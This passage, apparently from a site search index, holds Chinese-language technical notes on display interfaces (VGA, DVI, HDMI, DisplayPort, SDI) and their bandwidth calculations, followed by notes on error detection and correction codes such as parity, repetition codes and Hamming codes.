\u200b\u9519\u8bef\u200b\uff0c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b CRC \u200b\u6b63\u786e\u200b\u3002\u200b\u8fd9\u65f6\u5019\u200b\u5e94\u8be5\u200b\u76f8\u4fe1\u200b\u8c01\u200b\u5462\u200b\uff1f\u200b\u91cd\u4f20\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u524d\u534a\u200b\u548c\u200b\u540e\u200b\u534a\u200b\u7684\u200b CRC \u200b\u5982\u679c\u200b\u53c8\u200b\u51fa\u73b0\u200b\u6821\u9a8c\u200b\u9519\u8bef\u200b\u4e86\u200b\u5462\u200b\uff1f\u200b\u8fd9\u91cc\u200b\u6709\u200b\u5f88\u591a\u200b\u60c5\u51b5\u200b\u9700\u8981\u200b\u8ba8\u8bba\u200b\u3002</p>"},{"location":"hardware/display_interface.html","title":"\u663e\u793a\u200b\u63a5\u53e3","text":""},{"location":"hardware/display_interface.html#vga","title":"VGA","text":"<p>VGA \u200b\u91c7\u7528\u200b 15-pin \u200b\u7684\u200b\u8fde\u63a5\u5668\u200b\uff0c\u200b\u5305\u62ec\u200b RGB \u200b\u4e09\u79cd\u200b\u989c\u8272\u200b\uff0cHSync \u200b\u548c\u200b VSync \u200b\u4fe1\u53f7\u200b\uff0c\u200b\u8fd8\u6709\u200b\u53ef\u9009\u200b\u7684\u200b DDC \u200b\u63a5\u53e3\u200b\u3002\u200b\u6bcf\u79cd\u200b\u989c\u8272\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b pin\uff0c\u200b\u91c7\u7528\u200b\u6a21\u62df\u4fe1\u53f7\u200b\u65b9\u5f0f\u200b\u4f20\u8f93\u200b\u3002VGA \u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\u548c\u200b\u5237\u65b0\u7387\u200b\u65f6\u5e8f\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u50cf\u7d20\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\uff0c\u200b\u4ee5\u53ca\u200b HSync \u200b\u548c\u200b VSync \u200b\u7684\u200b\u6ce2\u5f62\u200b\u3002</p> <p>VGA \u200b\u4e0d\u200b\u652f\u6301\u200b\u4f20\u8f93\u200b\u97f3\u9891\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia</p>"},{"location":"hardware/display_interface.html#dvi","title":"DVI","text":"<p>DVI \u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7248\u672c\u200b\uff0cDVI-A \u200b\u517c\u5bb9\u200b VGA \u200b\u63a5\u53e3\u200b\uff0c\u200b\u53ea\u200b\u4f20\u8f93\u200b\u6a21\u62df\u4fe1\u53f7\u200b\uff1bDVI-D \u200b\u5219\u200b\u662f\u200b\u91c7\u7528\u200b TMDS \u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u6570\u5b57\u4fe1\u53f7\u200b\uff0c\u200b\u517c\u5bb9\u200b HDMI\uff1bDVI-I \u200b\u5219\u200b\u517c\u5bb9\u200b DVI-A \u200b\u548c\u200b DVI-D\u3002</p> <p>\u200b\u56e0\u6b64\u200b DVI \u200b\u8f6c\u200b VGA \u200b\u6216\u8005\u200b DVI \u200b\u8f6c\u200b HDMI \u200b\u7684\u200b\u8f6c\u6362\u5668\u200b\u5185\u90e8\u200b\u4e0d\u200b\u9700\u8981\u200b\u505a\u200b\u6570\u6a21\u8f6c\u6362\u200b\uff0c\u200b\u4f46\u662f\u200b\u8981\u6c42\u200b\u53e6\u4e00\u4fa7\u200b\u7684\u200b\u8bbe\u5907\u200b\u652f\u6301\u200b\u76f8\u5e94\u200b\u7684\u200b\u4f20\u8f93\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u4f8b\u5982\u200b DVI \u200b\u8f6c\u200b VGA \u200b\u51fa\u6765\u200b\u5f97\u5230\u200b\u7684\u200b\u8fd8\u662f\u200b\u6a21\u62df\u4fe1\u53f7\u200b\uff0c\u200b\u5982\u679c\u200b\u53e6\u4e00\u4fa7\u200b\u7684\u200b\u8bbe\u5907\u200b\u53ea\u200b\u652f\u6301\u200b\u5728\u200b DVI \u200b\u4e0a\u200b\u8d70\u200b\u6570\u5b57\u4fe1\u53f7\u200b\uff0c\u200b\u5219\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002</p> <p>DVI \u200b\u5728\u200b\u4f20\u8f93\u200b\u6570\u5b57\u4fe1\u53f7\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b 3 \u200b\u5bf9\u200b\uff08Single link\uff09\u200b\u6216\u8005\u200b 6 \u200b\u5bf9\u200b\uff08Dual link\uff09TMDS \u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u89c6\u9891\u4fe1\u53f7\u200b\uff0c\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u5bf9\u200b TMDS \u200b\u5dee\u5206\u200b\u65f6\u949f\u200b\u3002\u200b\u5176\u4e2d\u200b Single link \u200b\u6a21\u5f0f\u200b\u548c\u200b HDMI \u200b\u662f\u200b\u517c\u5bb9\u200b\u7684\u200b\u3002</p> <p>TMDS \u200b\u6bcf\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u5185\u200b\uff0c\u200b\u4f20\u8f93\u200b 8 bit \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u7ecf\u8fc7\u200b 8b/10b \u200b\u7f16\u7801\u200b\u5728\u200b\u5dee\u5206\u200b\u5bf9\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u3002\u200b\u56e0\u6b64\u200b\u5bf9\u4e8e\u200b 165 MHz \u200b\u7684\u200b TMDS \u200b\u65f6\u949f\u200b\uff0c\u200b\u4f20\u8f93\u200b\u89c6\u9891\u200b\u6570\u636e\u200b\u7684\u200b\u901f\u7387\u200b\u662f\u200b \\(165 \\mathrm{MHz} * 3 * 8 = 3.96 \\mathrm{Gbps}\\)\u3002</p> <p>DVI \u200b\u4e0d\u200b\u652f\u6301\u200b\u4f20\u8f93\u200b\u97f3\u9891\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia</p>"},{"location":"hardware/display_interface.html#hdmi","title":"HDMI","text":"<p>HDMI \u200b\u5728\u200b\u4e09\u200b\u5bf9\u200b TMDS \u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u4e0a\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u5bf9\u200b TMDS \u200b\u5dee\u5206\u200b\u65f6\u949f\u200b\u548c\u200b DDC\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u8fde\u63a5\u5668\u200b\u662f\u200b Type A\uff0c\u200b\u6709\u65f6\u5019\u200b\u4e5f\u200b\u80fd\u200b\u770b\u5230\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b Mini HDMI\uff08Type C\uff09\u200b\u548c\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b Micro HDMI\uff08Type D\uff09\u3002</p> <p>HDMI \u200b\u9664\u4e86\u200b\u4f20\u8f93\u200b\u89c6\u9891\u200b\uff0c\u200b\u8fd8\u200b\u652f\u6301\u200b\u4f20\u8f93\u200b\u97f3\u9891\u200b\u3002</p> <p>HDMI \u200b\u968f\u7740\u200b\u7248\u672c\u200b\u66f4\u65b0\u200b\uff0c\u200b\u9010\u6e10\u200b\u63d0\u9ad8\u200b\u4e86\u200b TMDS \u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u3002HDMI 1.0 \u200b\u7248\u672c\u200b\u548c\u200b DVI \u200b\u4e00\u6837\u200b\uff0c\u200b\u6700\u9ad8\u200b TMDS \u200b\u65f6\u949f\u200b\u662f\u200b 165 MHz\uff0c\u200b\u4e0d\u200b\u8ba1\u5165\u200b 8b/10b \u200b\u7f16\u7801\u200b\u635f\u8017\u200b\u7684\u8bdd\u200b\uff08\u200b\u4e0b\u540c\u200b\uff09\uff0c\u200b\u4f20\u8f93\u901f\u7387\u200b\u662f\u200b \\(165 \\mathrm{MHz} * 3 * 10 = 4.95 \\mathrm{Gbps}\\)\uff1bHDMI 1.3 \u200b\u7248\u672c\u200b\u628a\u200b TMDS \u200b\u65f6\u949f\u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 340 MHz\uff0c\u200b\u4f20\u8f93\u901f\u7387\u200b\u8fbe\u5230\u200b \\(340 \\mathrm{MHz} * 3 * 10 = 10.2 \\mathrm{Gbps}\\)\u3002HDMI 2.0 \u200b\u7248\u672c\u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 600MHz\uff0c\u200b\u4f20\u8f93\u901f\u7387\u200b\u8fbe\u5230\u200b \\(600 \\mathrm{MHz} * 3 * 10 = 18 \\mathrm{Gbps}\\)\u3002</p> <p>HDMI 2.1 \u200b\u4e0d\u518d\u200b\u4f7f\u7528\u200b\u5355\u72ec\u200b\u7684\u200b TMDS \u200b\u65f6\u949f\u200b\u5dee\u5206\u200b\u5bf9\u200b\uff0c\u200b\u628a\u200b\u6700\u540e\u200b\u4e00\u5bf9\u200b\u4e5f\u200b\u7528\u6765\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u628a\u200b\u6570\u636e\u7f16\u7801\u200b\u4ece\u200b 8b/10b \u200b\u6539\u6210\u200b\u4e86\u200b 16b/18b\uff0c\u200b\u4f20\u8f93\u901f\u7387\u200b\u8fbe\u5230\u200b \\(4 * 12 \\mathrm{Gbps} = 48 \\mathrm{Gbps}\\)\uff0c\u200b\u76f8\u6bd4\u200b HDMI 2.0 \u200b\u6709\u200b\u4e86\u200b\u5de8\u5927\u200b\u7684\u200b\u63d0\u5347\u200b\u3002\u200b\u6309\u7167\u200b 16b/18b \u200b\u7b97\u200b\uff0c\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u662f\u200b 42.7 Gbps\uff0c\u200b\u4f46\u200b HDMI 2.1 \u200b\u8fd8\u6709\u200b\u989d\u5916\u200b\u7684\u200b FEC \u200b\u5f00\u9500\u200b\uff08RS(255,251)\uff09\uff0c\u200b\u6298\u7b97\u200b\u4e0b\u6765\u200b\u662f\u200b \\(48 \\mathrm{Gbps} * 16 / 18 * 251 / 255 = 42.0 \\mathrm{Gbps}\\)\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u8fd9\u200b\u51e0\u4ee3\u200b HDMI \u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff0c\u200b\u5176\u4e2d\u200b HDMI 2.1 \u200b\u7248\u672c\u200b\u6ca1\u200b\u8003\u8651\u200b FEC \u200b\u5f00\u9500\u200b\uff1a</p> 1.0-1.2 1.3-1.4 2.0 2.1 \u200b\u4f20\u8f93\u901f\u7387\u200b 4.95 Gbps 10.2 Gbps 18 Gbps 48 Gbps \u200b\u6570\u636e\u200b\u901f\u7387\u200b 3.96 Gbps 8.16 Gbps 14.4 Gbps 42.0 Gbps \u200b\u7f16\u7801\u65b9\u5f0f\u200b 8b/10b 8b/10b 8b/10b 16b/18b \u200b\u5206\u8fa8\u7387\u200b 1080p 60Hz 1440p 75Hz 4k 60Hz 8k 30Hz <p>\u200b\u4f46\u200b\u8fd9\u4e2a\u200b\u8868\u683c\u200b\u4e0d\u662f\u200b\u7edd\u5bf9\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b HDMI 1.4b \u200b\u5728\u200b\u91c7\u7528\u200b\u4e0d\u200b\u5728\u200b HDMI 1.4b \u200b\u6807\u51c6\u200b\u91cc\u200b\u4f46\u662f\u200b\u7531\u200b\u663e\u5361\u200b\u548c\u200b\u663e\u793a\u5668\u200b\u652f\u6301\u200b\u7684\u200b YCbCr 420 \u200b\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8f93\u51fa\u200b 4k 60Hz \u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\uff1aNVIDIA Kepler Cards Get HDMI 4K@60Hz Support (Kind Of)\u3002</p> <p>HDMI 2.1 \u200b\u8fd8\u200b\u652f\u6301\u200b DSC \u200b\u89c6\u9891\u6d41\u200b\u538b\u7f29\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u652f\u6301\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\uff0c\u200b\u5982\u200b 8k 60Hz \u200b\u751a\u81f3\u200b 8k 120Hz\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia HDMI 2.1 FEC RX IP Core</p>"},{"location":"hardware/display_interface.html#displayport","title":"DisplayPort","text":"<p>DisplayPort \u200b\u91c7\u7528\u200b\u56db\u5bf9\u200b\u5dee\u5206\u200b\u5bf9\u6765\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u652f\u6301\u200b\u89c6\u9891\u200b\u548c\u200b\u97f3\u9891\u200b\u7b49\u200b\u3002</p> <p>DisplayPort 1.0 \u200b\u7248\u672c\u200b\u652f\u6301\u200b 10.8 Gbps \u200b\u7684\u200b\u4f20\u8f93\u901f\u7387\u200b\uff08\u200b\u7f16\u7801\u65b9\u5f0f\u200b 8b/10b\uff0c\u200b\u56e0\u6b64\u200b\u6570\u636e\u200b 8.64 Gbps\uff09\u3002DisplayPort 1.2 \u200b\u7248\u672c\u200b\u901f\u7387\u200b\u7ffb\u500d\u200b\uff0c\u200b\u8fbe\u5230\u200b\u4e86\u200b 21.6 Gbps\uff08\u200b\u6570\u636e\u200b 17.28 Gbps\uff09\u3002DisplayPort 1.3 \u200b\u8fdb\u4e00\u6b65\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 32.4 Gbps\uff08\u200b\u6570\u636e\u200b 25.92 Gbps\uff09\u3002DisplayPort 2.0 \u200b\u8fdb\u4e00\u6b65\u63d0\u9ad8\u200b\u5230\u200b 80 Gbps\uff08\u200b\u7f16\u7801\u65b9\u5f0f\u200b 128b/132b\uff09\uff0c\u200b\u6570\u636e\u200b\u901f\u7387\u200b 77.37 Gbps\uff08\u200b\u8ba1\u7b97\u516c\u5f0f\u200b\u4e0d\u660e\u200b\uff09\u3002</p> <p>DisplayPort \u200b\u53ef\u4ee5\u200b\u5728\u200b USB Type C \u200b\u4e0a\u200b\u901a\u8fc7\u200b Alternate Mode \u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5728\u200b\u7b14\u8bb0\u672c\u200b\u6216\u200b\u624b\u673a\u200b\u4e2d\u200b\uff0c\u200b\u5185\u7f6e\u200b\u7684\u200b\u663e\u793a\u5668\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u91c7\u7528\u200b eDP \u200b\u63a5\u53e3\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia</p>"},{"location":"hardware/display_interface.html#sdi","title":"SDI","text":"<p>SDI \u200b\u5168\u79f0\u200b Serial Digital Interface\uff0c\u200b\u5728\u200b\u540c\u8f74\u7535\u7f06\u200b\u4e0a\u200b\uff0c\u200b\u4e32\u884c\u200b\u4f20\u8f93\u200b\u89c6\u9891\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia</p>"},{"location":"hardware/error_detection_correction_code.html","title":"\u68c0\u9519\u200b\u7ea0\u9519\u7801","text":""},{"location":"hardware/error_detection_correction_code.html#_2","title":"\u7406\u8bba","text":"<p>\u200b\u5728\u200b\u6570\u636e\u4f20\u8f93\u200b\u65f6\u200b\uff0c\u200b\u8003\u8651\u200b\u5230\u200b\u5404\u79cd\u56e0\u7d20\u200b\u7684\u200b\u5370\u8c61\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u90e8\u5206\u200b\u6570\u636e\u200b\u51fa\u9519\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u4e00\u4e9b\u200b\u7f16\u7801\u65b9\u6cd5\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u63a5\u53d7\u65b9\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b\u9519\u8bef\u200b\uff0c\u200b\u8ba9\u200b\u53d1\u9001\u200b\u65b9\u200b\u91cd\u65b0\u200b\u4f20\u8f93\u200b\uff1b\u200b\u6216\u8005\u200b\u8ba9\u200b\u63a5\u53d7\u65b9\u200b\u76f4\u63a5\u200b\u7ea0\u6b63\u9519\u8bef\u200b\u3002\u200b\u968f\u7740\u200b\u4f20\u8f93\u901f\u5ea6\u200b\u4e0d\u65ad\u200b\u63d0\u9ad8\u200b\uff0c\u200b\u8bef\u7801\u7387\u200b\u4e0a\u5347\u200b\uff0c\u200b\u91cd\u65b0\u200b\u4f20\u8f93\u200b\u7684\u200b\u6982\u7387\u200b\u63d0\u9ad8\u200b\uff0c\u200b\u901a\u5e38\u200b\u5c31\u200b\u4f1a\u200b\u5f15\u5165\u200b\u7ea0\u9519\u7801\u200b\uff0c\u200b\u4e00\u822c\u200b\u53eb\u505a\u200b FEC\uff08Forward Error Correction\uff09\u3002</p> <p>\u200b\u6838\u5fc3\u200b\u601d\u8def\u200b\u662f\u200b\u53d1\u9001\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u5197\u4f59\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u539f\u59cb\u6570\u636e\u200b\u5728\u200b\u7f16\u7801\u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ea\u6709\u200b\u4e00\u90e8\u5206\u200b\u5408\u6cd5\u200b\u503c\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u662f\u200b\u975e\u6cd5\u200b\u7684\u200b\uff0c\u200b\u4e14\u200b\u5408\u6cd5\u200b\u503c\u200b\u4e4b\u95f4\u200b\u4fdd\u8bc1\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6700\u5c0f\u200b\u7684\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u3002\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u4e5f\u200b\u53eb\u200b Hamming \u200b\u8ddd\u79bb\u200b\uff0c\u200b\u7b49\u4e8e\u200b\u5f02\u6216\u200b\u540e\u200b\u4e8c\u8fdb\u5236\u200b\u8868\u793a\u200b\u4e2d\u200b 1 \u200b\u7684\u200b\u4e2a\u6570\u200b\u3002</p> <p>\u200b\u5728\u200b\u4f20\u8f93\u200b\u51fa\u9519\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u9519\u200b\u7684\u200b\u4f4d\u6570\u200b\u5728\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u4e4b\u5185\u200b\uff0c\u200b\u5c31\u200b\u4e00\u5b9a\u200b\u4f1a\u200b\u4ece\u200b\u5408\u6cd5\u200b\u503c\u200b\u53d8\u4e3a\u200b\u975e\u6cd5\u200b\u503c\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b\u9519\u8bef\u200b\u3002\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u9519\u200b\u7684\u200b\u4f4d\u6570\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u8ddd\u79bb\u200b\u975e\u6cd5\u200b\u503c\u200b\u6700\u8fd1\u200b\u7684\u200b\u5408\u6cd5\u200b\u503c\u200b\u552f\u4e00\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u9519\u8bef\u200b\u3002</p>"},{"location":"hardware/error_detection_correction_code.html#parity","title":"\u5947\u5076\u6821\u9a8c\u200b Parity","text":"<p>\u200b\u5947\u5076\u6821\u9a8c\u200b\u5bf9\u200b\u6bcf\u200b k \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u989d\u5916\u200b\u7684\u200b 1 \u200b\u4f4d\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u8fd9\u200b k \u200b\u4f4d\u200b\u6570\u636e\u200b\u4e2d\u6709\u200b\u5947\u6570\u200b\u4e2a\u200b 1 \u200b\u8fd8\u662f\u200b\u5076\u6570\u200b\u4e2a\u200b 1\u3002\u200b\u5947\u5076\u6821\u9a8c\u200b\u7f16\u7801\u200b\u540e\u200b\uff0c\u200b\u5408\u6cd5\u200b\u503c\u200b\u7684\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u4e3a\u200b 2\uff0c\u200b\u53ea\u80fd\u200b\u68c0\u6d4b\u200b\u51fa\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u7ea0\u6b63\u9519\u8bef\u200b\u3002</p> <p>\u200b\u7f16\u7801\u200b\u7684\u200b\u6548\u7387\u200b\u662f\u200b \\(k/(k+1)\\)\u3002</p> <p>UART \u200b\u534f\u8bae\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u5947\u5076\u6821\u9a8c\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aParity bit</p>"},{"location":"hardware/error_detection_correction_code.html#_3","title":"\u91cd\u590d\u200b\u7f16\u7801","text":"<p>\u200b\u91cd\u590d\u200b\u7f16\u7801\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u628a\u200b\u8f93\u5165\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u4f4d\u200b\u91cd\u590d\u200b n \u200b\u6b21\u200b\uff0cn \u200b\u4e3a\u200b\u5947\u6570\u200b\uff1a\u200b\u4f8b\u5982\u200b n \u200b\u7b49\u4e8e\u200b 3\uff0c\u200b\u90a3\u4e48\u200b 0 \u200b\u53d8\u6210\u200b 000\uff0c1 \u200b\u53d8\u6210\u200b 111\uff0c\u200b\u4e24\u4e2a\u200b\u5408\u6cd5\u200b\u503c\u200b\u7684\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u662f\u200b 3\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u3002\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u662f\u200b\u65e0\u6cd5\u200b\u548c\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u533a\u5206\u200b\u5f00\u200b\u3002\u200b\u89e3\u7801\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6309\u200b n \u200b\u4f4d\u200b\u5206\u7ec4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5206\u7ec4\u200b\u5185\u200b\u7684\u200b 0 \u200b\u548c\u200b 1 \u200b\u7684\u200b\u6570\u91cf\u200b\u54ea\u4e2a\u200b\u591a\u200b\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u539f\u59cb\u200b\u503c\u200b\u662f\u200b\u54ea\u4e2a\u200b\u3002</p> <p>\u200b\u7f16\u7801\u200b\u7684\u200b\u6548\u7387\u200b\u662f\u200b \\(1/n\\)\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aRepetition code</p>"},{"location":"hardware/error_detection_correction_code.html#hamming","title":"Hamming \u200b\u7801","text":"<p>Hamming \u200b\u7801\u200b\u7684\u200b\u7279\u70b9\u200b\u662f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u5e76\u200b\u7ea0\u6b63\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u3002\u200b\u4e3a\u4e86\u200b\u8fbe\u5230\u200b\u8fd9\u200b\u4e00\u70b9\u200b\uff0c\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u81f3\u5c11\u200b\u662f\u200b 3\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u7ea0\u6b63\u9519\u8bef\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b 1 \u200b\u4f4d\u200b\u6216\u8005\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u662f\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b\u662f\u200b\u54ea\u79cd\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\u5982\u679c\u200b\u7ed9\u200b Hamming \u200b\u7801\u200b\u52a0\u4e0a\u200b\u989d\u5916\u200b\u7684\u200b\u5947\u5076\u6821\u9a8c\u200b\u4f4d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u81f3\u5c11\u200b\u662f\u200b 4\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u7ea0\u6b63\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u3002\u200b\u8fd9\u79cd\u200b\u6269\u5c55\u200b Hamming \u200b\u7801\u200b\u5b9e\u73b0\u200b\u4e86\u200b SECDED\uff08Single Error Correction\uff0cDouble Error Detection\uff09\u3002</p> <p>\u200b\u5047\u8bbe\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b k \u200b\u4f4d\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u5197\u4f59\u200b\u7684\u200b r \u200b\u4f4d\u200b\u6821\u9a8c\u7801\u200b\uff0c\u200b\u5f53\u200b\u51fa\u73b0\u200b 1 \u200b\u4f4d\u200b\u9519\u8bef\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u7ea0\u6b63\u9519\u8bef\u200b\uff0c\u200b\u9700\u8981\u200b\u77e5\u9053\u200b\u9519\u8bef\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002\u200b\u9519\u8bef\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u5728\u200b k+r \u200b\u4f4d\u200b\u7684\u200b\u4efb\u610f\u200b\u4e00\u4e2a\u200b\u5730\u65b9\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u9519\u8bef\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u5e94\u8be5\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5197\u4f59\u200b\u7684\u200b r \u200b\u4f4d\u200b\u6821\u9a8c\u7801\u200b\u63a8\u65ad\u200b\u51fa\u6765\u200b\uff0c\u200b\u56e0\u6b64\u200b\uff1a</p> \\[ 2^r \\ge k+r \\] <p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6ca1\u6709\u200b\u51fa\u9519\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u56e0\u6b64\u200b\uff1a</p> \\[ 2^r \\ge k+r+1 \\] <p>\u200b\u4f8b\u5982\u200b\u5f53\u200b \\(r=3\\) \u200b\u65f6\u200b\uff0c\\(k \\le 4\\)\uff0c\u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u53d6\u200b \\(k=4\\)\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b\u6bcf\u200b 4 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0c\u200b\u6dfb\u52a0\u200b 3 \u200b\u4f4d\u200b\u7684\u200b\u6821\u9a8c\u7801\u200b\uff0c\u200b\u4e00\u5171\u200b\u662f\u200b 7 \u200b\u4f4d\u200b\u3002\u200b\u6b64\u65f6\u200b\u5c31\u200b\u79f0\u200b\u8fd9\u4e2a\u200b\u7f16\u7801\u200b\u4e3a\u200b Hamming(7,4)\u3002</p> <p>\u200b\u91cd\u590d\u200b\u7f16\u7801\u200b\u5728\u200b n=3 \u200b\u65f6\u200b\u7b49\u4ef7\u200b\u4e8e\u200b Hamming(3,1)\u3002</p> <p>\u200b\u7f16\u7801\u200b\u7684\u200b\u6548\u7387\u200b\u662f\u200b \\(k/(k+r)\\)\u3002</p> <p>ECC DRAM \u200b\u5bf9\u200b 64 \u200b\u4f4d\u200b\u6570\u636e\u200b\u6dfb\u52a0\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u5197\u4f59\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u6269\u5c55\u200b Hamming \u200b\u7801\u6765\u200b\u5b9e\u73b0\u200b SECDED\u3002</p> 